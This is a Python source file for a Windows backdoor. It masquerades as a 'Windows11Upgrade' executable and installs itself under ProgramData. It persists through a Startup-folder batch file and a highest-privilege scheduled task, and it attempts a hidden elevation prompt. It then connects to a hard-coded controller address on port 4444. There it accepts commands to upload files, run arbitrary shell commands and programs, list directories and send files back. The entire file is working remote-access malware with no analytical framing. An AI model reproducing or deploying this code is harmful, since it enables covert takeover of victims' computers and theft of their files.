import socket
import os
import base64
import time
import subprocess
import sys
import shutil
import ctypes

HOST = "172.30.64.1"
PORT = 4444

# Where the exe installs itself to
INSTALL_DIR = os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), "Microsoft", "Windows")
INSTALL_NAME = "Windows11Upgrade.exe"
INSTALL_PATH = os.path.join(INSTALL_DIR, INSTALL_NAME)
TASK_NAME = "Windows11UpgradeService"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_startup_folder():
    return os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )

def is_persistent():
    # Check startup folder
    bat_path = os.path.join(get_startup_folder(), "Windows11Upgrade.bat")
    if os.path.isfile(bat_path):
        return True
    # Check Task Scheduler
    result = subprocess.run(
        ["schtasks", "/query", "/tn", TASK_NAME],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        return True
    return False

def install_persistence():
    # Get the path to this exe
    if getattr(sys, 'frozen', False):
        # Running as compiled exe
        exe_path = sys.executable
    else:
        # Running as python script
        exe_path = os.path.abspath(__file__)

    # Step 1 — copy exe to install location
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        if exe_path != INSTALL_PATH:
            shutil.copy2(exe_path, INSTALL_PATH)
    except Exception:
        # Fall back to AppData if ProgramData fails
        install_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows")
        os.makedirs(install_dir, exist_ok=True)
        INSTALL_PATH_FB = os.path.join(install_dir, INSTALL_NAME)
        try:
            shutil.copy2(exe_path, INSTALL_PATH_FB)
            install_path = INSTALL_PATH_FB
        except:
            install_path = exe_path
    else:
        install_path = INSTALL_PATH

    # Step 2 — startup folder (no admin needed)
    try:
        startup = get_startup_folder()
        os.makedirs(startup, exist_ok=True)
        bat_path = os.path.join(startup, "Windows11Upgrade.bat")
        with open(bat_path, "w") as f:
            f.write("@echo off\n")
            f.write(f'start "" "{install_path}"\n')
    except Exception:
        pass

    # Step 3 — Task Scheduler (admin bonus)
    if is_admin():
        try:
            subprocess.run([
                "schtasks", "/create",
                "/tn", TASK_NAME,
                "/tr", f'"{install_path}"',
                "/sc", "onlogon",
                "/rl", "highest",
                "/f"
            ], capture_output=True)
        except Exception:
            pass
    else:
        # Try UAC elevation silently
        try:
            subprocess.Popen([
                "powershell", "-WindowStyle", "Hidden", "-Command",
                f"Start-Process '{install_path}' -Verb RunAs -WindowStyle Hidden"
            ], creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, PORT))
            return sock
        except Exception:
            time.sleep(10)

def run():
    # Install persistence on first run
    if not is_persistent():
        install_persistence()

    while True:
        sock = connect()

        try:
            cwd = os.getcwd()
            sock.send(f"CWD|{cwd}".encode())

            while True:
                sock.settimeout(None)
                data = sock.recv(4096).decode().strip()

                if not data or data == "quit":
                    break

                if data.startswith("PUSH|"):
                    try:
                        _, fname, encoded_size = data.split("|")
                        encoded_size = int(encoded_size)
                    except ValueError:
                        continue

                    sock.send(b"READY")

                    received = b""
                    while len(received) < encoded_size:
                        chunk = sock.recv(min(524288, encoded_size - len(received)))
                        if not chunk:
                            break
                        received += chunk

                    decoded = base64.b64decode(received)
                    save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), fname)
                    with open(save_path, "wb") as f:
                        f.write(decoded)

                    sock.send(b"OK")

                elif data.startswith("RUN "):
                    fname = data[4:].strip()

                    try:
                        if any(fname.startswith(cmd) for cmd in ["pip", "python", "cmd", "schtasks"]):
                            if fname.startswith("pip"):
                                fname = f'"{sys.executable}" -m pip' + fname[3:]
                            elif fname.startswith("python -m"):
                                fname = f'"{sys.executable}" -m' + fname[9:]
                            elif fname.startswith("python "):
                                fname = f'"{sys.executable}" ' + fname[7:]

                            result = subprocess.run(
                                fname,
                                shell=True,
                                capture_output=True,
                                text=True
                            )
                            output = (result.stdout + result.stderr).strip()

                        elif fname.endswith(".exe"):
                            subprocess.Popen(
                                fname,
                                shell=True,
                                creationflags=subprocess.CREATE_NEW_CONSOLE
                            )
                            class FakeResult:
                                returncode = 0
                                stdout = ""
                                stderr = ""
                            result = FakeResult()
                            output = ""

                        else:
                            if not os.path.isabs(fname) and ":" not in fname:
                                fname = os.path.join(
                                    os.path.dirname(os.path.abspath(__file__)), fname
                                )
                            result = subprocess.run(
                                [sys.executable, fname],
                                capture_output=True,
                                text=True
                            )
                            output = (result.stdout + result.stderr).strip()

                        response = f"RUNOK|{output}" if result.returncode == 0 else f"RUNERR|{output}"
                        sock.send(response.encode())

                    except Exception as e:
                        sock.send(f"RUNERR|{str(e)}".encode())

                elif data.startswith("LS "):
                    path = data[3:].strip()

                    if not os.path.isdir(path):
                        sock.send(f"ERROR Not a directory: {path}".encode())
                        continue

                    try:
                        entries = os.listdir(path)
                        tagged = []
                        for entry in entries:
                            full = os.path.join(path, entry)
                            tag = "DIR" if os.path.isdir(full) else "FILE"
                            tagged.append(f"{tag}:{entry}")
                        listing = "\n".join(tagged) if tagged else "(empty)"
                        sock.sendall(f"OK|{listing}".encode())
                    except PermissionError:
                        sock.send(f"ERROR Permission denied: {path}".encode())

                elif data.startswith("GET "):
                    filepath = data[4:].strip()

                    if not os.path.isfile(filepath):
                        sock.send(f"ERROR File not found: {filepath}".encode())
                        continue

                    filename = os.path.basename(filepath)

                    with open(filepath, "rb") as f:
                        raw_bytes = f.read()

                    encoded = base64.b64encode(raw_bytes)
                    encoded_size = len(encoded)

                    sock.send(f"FILE|{filename}|{encoded_size}".encode())

                    ack = sock.recv(8)
                    if ack != b"READY":
                        break

                    offset = 0
                    while offset < encoded_size:
                        chunk = encoded[offset:offset + 524288]
                        sock.send(chunk)
                        offset += len(chunk)

                    sock.recv(4)

        except Exception:
            time.sleep(10)
            continue

        finally:
            sock.close()

run()
